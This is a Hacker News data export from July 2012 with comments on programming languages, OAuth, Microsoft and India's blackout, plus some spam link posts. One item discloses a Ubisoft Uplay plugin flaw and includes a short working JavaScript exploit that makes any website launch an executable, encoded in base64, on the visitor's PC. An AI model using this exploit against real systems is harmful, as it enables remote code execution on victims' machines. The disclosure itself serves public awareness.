ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
4311328,story,,,4,0,keithvan,"A Day Job Waiting for a Kill Shot a World Away",http://www.nytimes.com/2012/07/30/us/drone-pilots-waiting-for-a-kill-shot-7000-miles-away.html,,1343634863
4311327,comment,4311060,4311060,13,0,tikhonj,,,"It's a good comparison of the two languages.<p>Regarding type classes, I personally like Haskell's approach more. I haven't used Scala, so I'm assuming that objects there behave the same as modules in OCaml (at least in practice for this particular purpose). Essentially, Haskell makes the right compromise: the most common case (having one instance per type) is easy while the less common case (explicitly specifying the instance) is less easy. The core difference is this: when you want to use a different ""instance"" in OCaml, you just pass in a different module; in Haskell, you have to create a new type.<p>Happily, creating a new type is easy, especially with newtype deriving which lets you bring instances you don't want to change over to your new type for free. This has some advantages: the instance is now encoded in the type, so that you cannot mix different ones by accident. This is useful because it's quite easy to have code that depends on, for example, a consistent compare function in different places on the same type.  This also lets the choice of implementation be implicit at the call site, so you only have to specify the instance once rather than repeatedly in different places.<p>I think there is also a good case for type classes not being reified as modules or dictionaries or objects or what have you: they essentially exist exclusively at the type level. That is, the instances are a property of each type, not part of a module or anything like that. This also makes the syntax for types clearer: the => acts as implication and the type class acts as a predicate on the type.<p>In summary: type classes <i>are</i> more restrictive than first-class modules, but this is a good compromise. You can get the same effect with newtype, with the added bonus of having the difference reflected in the type system.<p>I'm afraid I have not managed to make my thoughts on type classes too clear. I've been thinking about that particular design trade-off (type classes vs first-class modules) and writing this has probably helped me get my thoughts together far more than it will help any readers :P. Maybe I'll write a blog post about it--I've been meaning to start a blog for a while now...<p>Some other thoughts: I think laziness is a good thing because you trade performance for simplicity and expressiveness. It's easier to add strictness to a lazy language than vice-versa. But I essentially use Haskell where others would use something like Python, so its <i>relative</i> performance is well beyond satisfactory even with plenty of space leaks :P.<p>As far as developer tools go, Scala has Ensime [1] and Haskell has Scion [2] but I've used neither. OCaml has TypeRex [3], which I <i>have</i> used and is pretty cool. Assuming that Ensime and Scion are similar to TypeRex, they're certainly good enough. You never have to leave Emacs :).<p>[1]: <a href=""https://github.com/aemoncannon/ensime/"" rel=""nofollow"">https://github.com/aemoncannon/ensime/</a><p>[2]: <a href=""http://code.google.com/p/scion-lib/"" rel=""nofollow"">http://code.google.com/p/scion-lib/</a><p>[3]: <a href=""http://typerex.org/"" rel=""nofollow"">http://typerex.org/</a><p>Coincidentally, OCaml has some of the advantages the author found in Scala while being more like Haskell. I would certainly consider at least playing around with it a bit--it's a very nice language. I still prefer Haskell, but not by too large a margin.",1343634824
4311326,story,,,1,0,guru002,"Love marriage specilist astrologer",http://lostlovebackastrologer.com/,"best astrologer in world he is great horoscope in world shastri ji is very successes full man in astrology",1343634800
4311325,story,,,4,0,sytelus,"7 Minutes of Terror - Landing the Curiosity Rover on Mars",http://www.youtube.com/watch?v=8AcJpZBN71I,,1343634798
4311324,comment,4310859,4311172,7,0,benatkin,,,"Well, participating in the OAuth 2.0 committee is what brought about that decision, not OAuth 2.0 itself. In fact Eran has a suggestion in that post under the ""To Upgrade or Not to Upgrade"" heading: look at what Facebook does and do that.",1343634792
4311323,comment,4311196,4311259,2,0,Haimpekel,,,"You still need to specify ""how do you know that person"", if you don't know him they still block your request.",1343634728
4311322,comment,4306292,4309329,3,0,nimh,,,"It's live links that are the problem, not just containing the URL.",1343634657
4311321,story,,,1,0,akitokimi,,http://ubuge.datsumou-shinjuku.info/,,1343634609
4311320,comment,4310423,4311260,1,0,iamdave,,,"Exactly the way I read this headline.<p>Not that I have a problem with this exactly, whenever ad dollars start falling many large scale web properties have historically reacted in one of two ways: (1) providing a premium based subscription service that forces quality content or users will drop (the opposite of this being a free, impression driven, quality agnostic model by splitting up articles over multiple pages) or (2) increasing ad costs which in turn results in more scrutiny in what is being fed through the ad engine.<p>These aren't the gold standards, please keep that in mind; it's purely anecdotal.  I threw this observation over at a friend who is a professional affiliate marketer and has his own four man firm, he concurs.  When ad dollars drop, media companies fight for whatever revenue normalcy they can get by improving quality in the two areas users have the biggest impact: interacting with your media and interacting with the ads supporting said media.<p>I'm optimistic here.",1343634514
4311319,story,,,1,0,siliconpage50,"Inloggen op Facebook.nl - Vrienden Zoeken, Facebook Verwijderen Account ","http://www.inloggenin.info/2012/07/inloggen-op-facebooknl-vrienden-zoeken.html ","Facebook.nl is one of the best social networking website with millions of users attached through it. Fb is the word which now you will find on every teenagers mouth. It is their favorite website where they want to like to spend their most of the time because here they can vrienden zoeken by inloggen op Facebook.",1343634478
4311318,comment,4309113,4310624,2,0,dlitz,,,"What does it even <i>mean</i> to provide an ""understanding of the world"" if you're not offering predictive, objective power?  As far as I know, understanding the world---by definition---means building a mental model of it that has predictive power.",1343634453
4311316,comment,4310030,4311101,2,0,jamesaguilar,,,"I doubt he'd get hell-banned for that. Maybe he deleted it? Or a dup account? But it doesn't seem like spammer activity so I'm guessing not.",1343634374
4311315,comment,4311304,4311304,1,0,dgarner,,,"interesting UX, I almost didn't get the hidden code ;-)",1343634315
4311314,comment,4309566,4309566,1,0,igorw2,,,"This is an excellent example of how _not_ to write code.<p>Custom autoloading scheme instead of PSR-0? Classname.inc.php, seriously? Moving on, dynamic variables are a terrible unfeature that should be avoided. References usually cause more harm than good and should be avoided as well. And finally, a class which is named with a redundant ""Class"" suffix, containing only static members, aka class-oriented programming.",1343634310
4311313,story,,,1,0,Haimpekel,"If You Havent Read Getting Things Done, Read This Post",http://techcocktail.com/getting-things-done-2012-07,"Productivity is not just a vague concept that highly privileged corporate executives boast about. There are specific, everyday actions that can boost anyones",1343634291
4311312,comment,4311145,4311145,1,0,jamesaguilar,,,"I wonder how many times I've read ""X isn't a hobby."" about a company. Seems like Microsoft and Google are the target of that phrase far more often than most. Kinda sad what that says about the fickleness of the product management organizations in these companies.",1343634219
4311310,comment,4311308,4311308,0,0,rickydsouza,,,"Build your own branded cloud backup software.",1343634166
4311309,comment,4310416,4310416,1,0,perlpimp,,,"Great pickmeup for this morning, in Moscow, Russia.
Thanks!",1343634152
4311308,story,,,1,1,rickydsouza,"Build Your Brand Buzz with StoreGrid",http://blog.vembu.com/build-your-brand-buzz-with-storegrid/,,1343634125
4311307,story,,,1,0,wahidun28,"Cara pemesanan jelly gamat luxor",http://obat-wahidpermana.blogspot.com/p/cara-pemesanan-jelly-gamat-luxor.html,"Kami sebagai agen resmi produk kesehatan jelly gamat luxor asli dan bergaransi senantiasa memberikan pelayanan terbaik bagi anda yang bermaksud membeli produk kesehatan jelly gamat luxor.Berbagai kemudahan yang kami tawarkan.",1343634072
4311306,comment,4310423,4311245,1,0,halayli,,,"They are just too greedy.",1343634061
4311305,story,,,1,0,wholebeadsoy,"Wz 111",http://bookmarkjump.com/story.php?title=bicone-crystal-beads,,1343634050
4311303,story,,,1,0,webmasterkimm,"Toronto Airport Limo Flat Rate inc. - Mississauga, ON - 647-802-6766 - 411.ca",http://411.ca/business/profile/7767346,,1343634031
4311302,story,,,2,0,gauravsc,"India's worst power blackout in 11 years",http://www.ndtv.com/article/cheat-sheet/north-india-s-worst-power-crisis-in-11-years-60-electricity-restored-says-power-minister-248943,,1343634029
4311301,comment,4311145,4311145,6,0,taligent,,,"The number one priority for MS needs to be unifying the SDKs, app and payment platforms for Win8, WP8 and XBox Live.<p>If developers were able to target all three with a single codebase it would be a game changer and I can easily see it being the number 2 development platform behind iOS.",1343634006
4311300,comment,4306600,4311161,1,0,mcpherrinm,,,"The DNS resolves supported websites to their hosts, which proxy through the US.  (n.b, not verified but that's a sane implementation of this)",1343633920
4311299,comment,4310423,4311017,2,0,jeffool,,,"If you think retaining some information at the behest of a government or source makes you a corrupt broker of information... Then there's never been a pure news agent ever.",1343633874
4311298,comment,4311281,4311281,3,0,ghshephard,,,"What's interesting to me, is that this AP report <a href=""http://news.yahoo.com/major-power-outage-hits-northern-indian-cities-031800371--finance.html"" rel=""nofollow"">http://news.yahoo.com/major-power-outage-hits-northern-india...</a> claims that "" Shivpal Singh Yadav, the power minister in the state of Uttar Pradesh, home to 200 million people, said that while demand during peak hours hits 11,000 megawatts, the state can only provide 9,000 megawatts.""<p>In comparison, California, which is known for both having marginal capacity, and being (relatively) low-user of electricity per capita (because of the mild climate) - has a population of around 38 million, and, according to CalIso, about 41,000 megawatts of generation capacity available (not all of it in California, mind you) - <a href=""http://www.caiso.com/outlook/SystemStatus.html"" rel=""nofollow"">http://www.caiso.com/outlook/SystemStatus.html</a>",1343633865
4311297,story,,,1,0,daisynemo,"Louis Vuitton Outlet,Monogram Canvas",http://www.louisvuittonoutletstore360.com/,,1343633804
4311296,comment,4310739,4311211,2,0,jahmed,,,"PS donate to erowid. It is a fantastic resource providing some of the most factual and unfiltered information of this kind.",1343633772
4311295,comment,4310416,4310416,1,0,bert2002,,,"very nice, but need a version without Flash.",1343633758
4311294,comment,4311145,4311145,7,0,kanedank,,,"""Linux may be neutralized as a competitive threat"" was his prediction based on last years 10-k.<p>What world is this man living in? One where servers don't count, only direct consumer products?",1343633693
4311293,comment,4311148,4311182,1,0,jayfuerstenberg,,,"I noticed this too.  The noun project (<a href=""http://thenounproject.com/"" rel=""nofollow"">http://thenounproject.com/</a>) has a better interface where, when you reach the bottom, the next batch auto-loads into view.<p>The icons so look decent here though.",1343633640
4311292,story,,,1,0,joschi,"Why You Should Always Use Nginx With Microcaching",http://www.howtoforge.com/why-you-should-always-use-nginx-with-microcaching,,1343633638
4311291,comment,4310859,4311192,1,0,shock3naw,,,"I highly doubt that most spec/project leaders abandon their projects because they consider it a 'professional disappointment.' I can't think of any such projects off the top of my head. On the contrary, I imagine that many feel that they have little left to contribute and want a fresher pair of hands to guide it forwards.<p>Everything 'should' be judged on its own merits, but humans have a tendency to make snap judgements. We make them everyday when we see someone we've never met, or are introduced to someone new. To be fair, my statement was based on my personal opinion and feelings after reading Eran's piece. Perhaps OAuth 2 really is going to take off, but I can't imagine how terrible something would have to be to give up 3-5 years of my life's work.<p>edit: To be clear, I should acknowledge that sometimes snap judgements are wrong. Sometimes they are right. But when we make them, we save ourselves the burden of exhaustively investigating _every_ possible technology, or that everyone might be a great person and friend. Eran's post was enough to convince me that I should stay away from OAuth 2 until convinced otherwise.",1343633623
4311290,comment,4311264,4311264,27,0,kinetik,,,"Original source: <a href=""http://seclists.org/fulldisclosure/2012/Jul/375"" rel=""nofollow"">http://seclists.org/fulldisclosure/2012/Jul/375</a>",1343633589
4311289,comment,4311253,4311253,1,0,jhull,,,"Not something I had thought about initially, but agree that they are missing the ""what the user sees"" view similar to how Google lets you see what different searches look like with your ads.[1]<p>[1] Google AdPreview tool <a href=""https://adwords.google.com/d/AdPreview"" rel=""nofollow"">https://adwords.google.com/d/AdPreview</a>",1343633568
4311288,comment,4310030,4310222,2,0,stevewilhelm,,,"Just to name a few: on the consumer side, Yahoo! is remarkably good at Sports including Fantasy Football and Baseball, and on the technical side it's remarkably good at Hadoop.",1343633516
4311287,story,,,343,119,troyhunt,"Lessons in website security anti-patterns by Tesco",http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html,,1343633511
4311286,comment,4308327,4308639,1,0,shrughes,,,"And calculus is used in graphics.",1343633440
4311285,comment,4307994,4307994,1,0,bert2002,,,"For Medals you could use this: <a href=""https://www.gstatic.com/london/2012/portal/medals.js"" rel=""nofollow"">https://www.gstatic.com/london/2012/portal/medals.js</a>",1343633415
4311284,comment,4309345,4311231,4,0,freshhawk,,,"There are no fields where the newest practical techniques are taught in courses. Those are invented in the field and trickle down.<p>I'm not saying it's not impressive or not being done by the best marketers. Not at all. I thought that was clear. There all talented people in every profession, that's what people do.<p>I'm saying that it won't be called ""growth hacking"" in a short time and it will go on the buzzword bingo card and will only be used ironically. And I wish the community who read about these great marketers saw through the pandering and childish ""growth hacking"" term as a (successful and well done) branding attempt.",1343633392
4311283,story,,,1,0,rajnandini000,"Paras Tierea Noida",http://rajnandini.com/Paras-Tierea-Noida-Sec-137,,1343633364
4311282,comment,4310929,4311111,1,0,jwagner,,,"The footer states it: the sea levels and vertical extents are not to scale.",1343633360
4311281,story,,,16,4,ghshephard,"India Blackout Leaves 300 Million Without Power",http://www.nytimes.com/reuters/2012/07/30/world/asia/30reuters-india-blackout.html?hp,,1343633352
4311280,story,,,80,15,kinetik,"Binary search is a pathological case for caches",http://www.pvk.ca/Blog/2012/07/30/binary-search-is-a-pathological-case-for-caches/,,1343633339
4311279,comment,4309527,4310598,5,0,jrockway,,,"I kind of doubt Xah is actually trolling; he's just a strange person with strange ideas.  How many people blog about their first experience with a prostitute under their real name?",1343633302
4311278,comment,4311134,4311134,2,0,joelrunyon,,,"I'm assuming you want to MVP this sucker, get it up and test it as quick as possible. I'll also approach this from a ""tools you need"" to build it as I'll assume you've thought through the marketing aspect.<p>If that's the case, there is no reason you need to hire a developer to build this.  If you want to MVP this and just test something, you can throw up a landing page with Premise 2.0 software from copyblogger. I've written a tutorial on this   here - <a href=""http://socialmouths.com/blog/2012/04/17/premise-2-0/"" rel=""nofollow"">http://socialmouths.com/blog/2012/04/17/premise-2-0/</a> . It's almost offensively simple to do and you should be able to have a decent opt-in page up and running in 20 minutes.<p>If you're looking to collect emails, I would integrate it with MailChimp (Aweber is better, but MailChimp is free for your first 2000 contacts).<p>As for marketing, we'd have to know more about what you're interested in selling eventually to these customers as your incentives for getting them to sign up will vary based on wherever their interest should be targeted.<p>Hope that helps.",1343633301
4311277,story,,,1,0,qptopm,"London 2012 Fencing - Fourth Day Doodle from Google",http://www.youtube.com/watch?v=v8DmwxRT7t4,,1343633277
4311276,story,,,16,15,ashray,"How to travel the world while freelancing as a programmer",http://bkpk.me/programmers-its-time-to-pack-your-bags/,,1343633256
4311275,story,,,1,0,mohammedfathey,"  :   ",http://akhbarak2012.blogspot.com/2012/07/London-Olympics-2012-Fencing.html,,1343633235
4311274,story,,,1,0,layson018f,"Byron leftwich jersey",http://www.365djerseys.com/pittsburgh-steelers-byron-leftwich-jersey-4-white-p-1759.html,,1343633193
4311273,comment,4310739,4310739,9,0,waterlesscloud,,,"Interesting. I just finished reading a book mentioned in the article, ""What The Dormouse Said"", which traces the interaction of the 60s counterculture and the formation of Silicon Valley computer culture.<p>Based on the book, LSD was used by a lot more of the early computer pioneers than you might imagine.  Everyone knows Steve Jobs talked glowingly about his LSD experience, but there were many others as well.<p>The book is worth a read, it's an unusual perspective on both hippie culture and computer culture.",1343633127
4311272,story,,,1,0,pacificbedrock,"Beige Marbles- Carved Marble Columns",http://www.pacificbedrock.com/SubProduct-The-Collection.aspx,"Pacific Bedrock Industrial Co. Ltd. can offer you our beige marble collection direct from our exclusive queries factory. We can offer our high quality products made from this precious and rare material for modern.",1343633098
4311271,story,,,1,0,pacificbedrock,"Marble Columns, Granite Columns",http://pacificbedrock.blogspot.com/,"Marble is supposed to be the divine stone that is highly-beautiful in nature. It not only complements traditional houses, churches, mosques, temples or castles, but elaborates the intrinsic beauty of the modern homes.",1343633069
4311270,story,,,5,2,jhull,"Ask HN: Legality of Streaming Geo-Locked Content with a VPN",,"Just curious since I am no expert. Is it legal to stream geo-locked content with a VPN, i.e. watching the Olympics on BBC while in the US. What laws would I be breaking?<p>What about for watching Netflix while traveling in Africa? (In this case I am paying for Netflix.)",1343633051
4311269,comment,4310362,4310362,1,0,azov,,,"This is exactly the arguments to apply in Padmapper vs Craigslist case.",1343633007
4311268,comment,4311145,4311256,2,0,jblock,,,"Not to nitpick or defend MS, but it sounds like they don't want to call it 8 unless it has all of the hardware features specified by 8 (like NFC). From what I understand it will get all of the new software benefits/features of Windows 8, just not in name.",1343632988
4311266,comment,4310859,4311239,7,0,nl,,,"I don't get that at all.<p>I think the OAuth 2.0 story <i>is</i> complicated, support <i>is</i> mixed and Bray's post acknowledges that.",1343632943
4311265,story,,,1,0,vskr,"Crowd sourcing education loans",http://randomthoughtsonrandomstuff.tumblr.com/post/28323997399/crowd-sourcing-education-loans,,1343632792
4311264,story,,,311,138,rightclick,"Ubisoft ""Uplay"" DRM exposed as rootkit",,"If you play one of the games below try clicking on this link (tested with Assassin's Creed on Win7 and FireFox).<p>http://pastehtml.com/view/c6gxl1a79.html<p><pre><code>  var x = document.createElement('OBJECT');
  
  x.setAttribute(""type"", ""application/x-uplaypc"");
  document.body.appendChild(x);
  x.open(""-orbit_product_id 1 -orbit_exe_path QzpcV0lORE9XU1xTWVNURU0zMlxDQUxDLkVYRQ== -uplay_steam_mode -uplay_dev_mode -uplay_dev_mode_auto_play"")
</code></pre>
Ubisoft installs a backdoor that allows any website to take over your computer. The Sony BMG rootkit was also DRM and required product recall when it was discovered.<p>http://en.wikipedia.org/wiki/Ubisoft#Games<p><pre><code>    Assassin's Creed II
    Assassin's Creed: Brotherhood
    Assassin's Creed: Project Legacy
    Assassin's Creed Revelations
    Assassin's Creed III
    Beowulf: The Game
    Brothers in Arms: Furious 4
    Call of Juarez: The Cartel
    Driver: San Francisco
    Heroes of Might and Magic VI
    Just Dance 3
    Prince of Persia: The Forgotten Sands
    Pure Football
    R.U.S.E.
    Shaun White Skateboarding
    Silent Hunter 5: Battle of the Atlantic
    The Settlers 7: Paths to a Kingdom
    Tom Clancy's H.A.W.X. 2
    Tom Clancy's Ghost Recon: Future Soldier
    Tom Clancy's Splinter Cell: Conviction
    Your Shape: Fitness Evolved</code></pre>",1343632788
4311263,story,,,1,0,zoowar,"Power cut hits northern India causing major disruption",http://www.bbc.co.uk/news/world-asia-india-19043972,,1343632782
4311262,story,,,1,0,erenas19s,"Future Beauty: 30 Years of Japanese Fashion",http://www.glamourgoddessfashion.com/archives/55508,,1343632756
4311261,story,,,1,0,sharptooth,"Is Raspberry Pi really credit card sized?",http://nomarketingbs.blogspot.com/2012/07/raspberry-pi-is-not-credit-card-sized.html,,1343632725
4311260,comment,4310423,4310533,11,0,cpeterso,,,"I guess ""now supported by reader subscriptions"" is a glass-half-full way of saying advertising revenue is down.",1343632573
4311259,comment,4311196,4311196,4,0,petercooper,,,"I didn't know LinkedIn limited connections to anyone before. Is this something based on newer accounts or accounts without a certain number of connects? I've always been able to 'connect' to anyone even outside of my network.",1343632564
4311258,comment,4309201,4310872,1,0,wesley,,,"I hope it's not Alex Chiu's immortality rings.. ;)",1343632549
4311257,comment,4310423,4311132,2,0,rblackwater,,,"I find it unacceptable to have any advertisement mingling with content that I have paid for. I stopped reading magazines long ago (before the internet was a real alternative) for this reason. After a person purchases something, they should be treated like a customer, not treated like a product.",1343632546
4311256,comment,4311145,4311145,4,0,qatalo,,,"Too little, too late? While Microsoft fantasizing about an ecosystem to thrive on; there are plenty others that have an established footing and beyond.<p>I have already put down my WP7 phone, not pleased that I cant upgrade to WP8. I am sure the MILLIONS of lumia owners will never pick up one again either.",1343632511
4311255,story,,,1,0,imran,"Late Bloomer, not a Loser.",http://500hats.com/late-bloomer/,,1343632449
4311254,comment,4310474,4310474,1,0,fchollet,,,"Twitter seems to be quite dominant overall in Asia, possibly for cultural reasons (Facebook is such a western-thought design). In Japan for instance Twitter took off long before Facebook did, and is still much bigger today.",1343632426
4311253,story,,,2,1,apievangelist,"API Driven Twitter Advertising",http://www.apievangelist.com/2012/07/29/api-driven-twitter-advertising/,,1343632386
4311252,comment,4306600,4308018,1,0,cheald,,,"Frankly, I'd rather pay 150/year for all the BBC programming (without commercials, including full online on-demand streaming) than $720/year for my cable company's ""basic"" package (which I continue to pay for by sitting through advertising for a third of the show's airtime anyway). If we bought that model to the US, I'd be ecstatic.",1343632370
4311251,story,,,2,0,giis,"Anna hazare and fight against corruption ",http://news.outlookindia.com/items.aspx?artid=770355,,1343632359
4311250,comment,4311004,4311004,0,0,JonnieCache,,,"Had a look at low_pass_filter.js hoping to see the source for the filter written out, apparently that stuff is all built into the web audio api. It has oscillators, it has Highpass, Bandpass, Lowshelf, Highshelf, Peaking, Notch, Allpass as well as Lowpass filters. It does compression, delay, waveshaping, wavetables, even convolution! I had no idea it was that high level! I wonder what the square wave sounds like? Mmmmmm... square waves...<p>Here's the list: <a href=""https://dvcs.w3.org/hg/audio/raw-file/tip/webaudio/specification.html"" rel=""nofollow"">https://dvcs.w3.org/hg/audio/raw-file/tip/webaudio/specifica...</a><p>Don't know how much of that spec is implemented, but with all that you should be able to make some pretty crazy noises. The google moog code looks very easy to hack as well.<p>Once someone samples some of those old SID chips and the like into those wavetables we're going to see an explosion of html5 games with awesome 8-bit sounds.",1343632343
4311249,story,,,1,0,ldbjd1,,http://www.laidingba.com/hotel_14846.html,,1343632263
4311248,story,,,1,0,cpeterso,"Revive and Restore - deep ecological enrichment through extinct species revival",http://blog.longnow.org/02012/07/16/revive-and-restore/,,1343632258
4311247,comment,4310135,4310835,6,0,drgath,,,"> Why is everyone acting like it's on it's beyond redemption?<p>Because the only things that get attention in SV are products with growth.  Yahoo is a very profitable company and has billions in the bank, so it'll be around for a while, with or without a rebound.",1343632257
4311246,story,,,1,0,kellymarion6,"Fix A Few Most Annoying Firefox Problems",http://www.ezineart.com/computers/software/fix-a-few-most-annoying-firefox-problems-,,1343632254
4311245,comment,4310423,4310738,3,0,natrius,,,"Publications can charge more to advertise to paying customers.",1343632245
4311244,story,,,2,0,jasoncartwright,"Olympics-Please, do not tweet unless you have to, fans told",http://www.reuters.com/article/2012/07/29/oly-twitter-day-idUSL6E8IT1RA20120729,,1343632183
4311243,story,,,12,0,ssorallen,"Airbnb Tech Talk: Justin Tulloss on Rdio's JS",http://www.airbnb.com/meetups/2mbnbp48n-tech-talk-justin-tulloss,,1343632139
4311242,comment,4309201,4309201,1,0,praveenpenumaka,,,"Cant we do this with mobile application? Mobile vibrating when there is increased magnetic field or something like that. Someone can check with sample app?",1343632131
4311241,comment,4307136,4308742,1,0,Bob_W,,,"I wonder if a good approach would be to provide an audio-only website if you use the audio-only CAPTCHA? Cracking one word is one thing, but if the website then goes on with ""Press 1 for your account balance...""",1343632108
4311240,story,,,1,0,weixiaomep,,http://www.underwear-lady.com/,2012,1343632097
4311239,comment,4310859,4311096,8,0,refulgentis,,,"A ridiculous amount. I'm an outsider to all this (iOS developer with a healthy interest in technology), and the constant pejorative adjectives directed at Hammer combined with the odd directions to the reader to ""find (strong options re: Hammer) on the Net"" and the horrible word insertion in Hammer's mouth that's Hammer's ""pissed at everyone""...combine to make this post seem like it has a lot more sizzle than steak.<p>""First Take-Away"" is devoted to ""hay, Google implemented OAuth 2"". That, as far as I understand it, is hot air because it doesn't obviate Hammer's original contention that OAuth 2 was impossible to implement without experts driving your implementation.<p>""Interop?"" is devoted to him throwing out a wildly idealistic idea, immediately followed up by him noting that he has no idea if it's possible.<p>""Enterprisey"" notes that he doesn't understand the enterprise requirements, understanding enterprise requirements requires expert-level domain knowledge (again, bolstering Hammer's point) and boy, those enterprise people sure are crazy!<p>""Standards-Making"" opens by trying to use clever wordplay that has the effect of making Hammer seems small for being ""pissed at everyone"", and an unwarranted defense of standardization proposals aimed at those commenting on the fact the the head of a standardization proposal said standardization proposals are broken.<p>The most confusing part of this to me is that Bray wrote an article (<a href=""http://www.tbray.org/ongoing/When/201x/2012/06/29/Becoming-an-Identity-guy"" rel=""nofollow"">http://www.tbray.org/ongoing/When/201x/2012/06/29/Becoming-a...</a>) <i>less than one month ago</i>  noting that ""The new technology coming down the pipe, OAuth 2 and friends, is way too hard for developers; there need to be better tools and services if were going to make this whole Internet thing smoother and safer."" Yet, somehow he feels that Hammer's opinion is divergent enough from what he said to be worthy of a long sanctimonious, vacuous, article.<p>I don't understand why Tim Bray is respected by the tech community, and after two years of following tech news and giving him the benefit of the doubt, I'm not going to bother anymore. He seems perfectly intelligent, but his tendency online of having overwrought reactions that conflict with prior overwrought reactions he had make it difficult for me to consider him anything but a bloviator.",1343632081
4311238,comment,4311145,4311145,4,0,latch,,,"TL;DR - In the <i>Risk Factors</i> section of this years 10-K, Microsoft used the word ""service"" almost twice as much.",1343632073
4311237,story,,,1,0,creativityhurts,"Talk to Me, One Machine Said to the Other",http://www.nytimes.com/2012/07/30/technology/talk-to-me-one-machine-said-to-the-other.html?pagewanted=all,,1343632057
4311236,comment,4310039,4310522,1,0,modarts,,,"Why is there this overwhelmingly anti-bootstrapping sentiment present in the startup community?  What's so wrong with taking outside funding?",1343631943
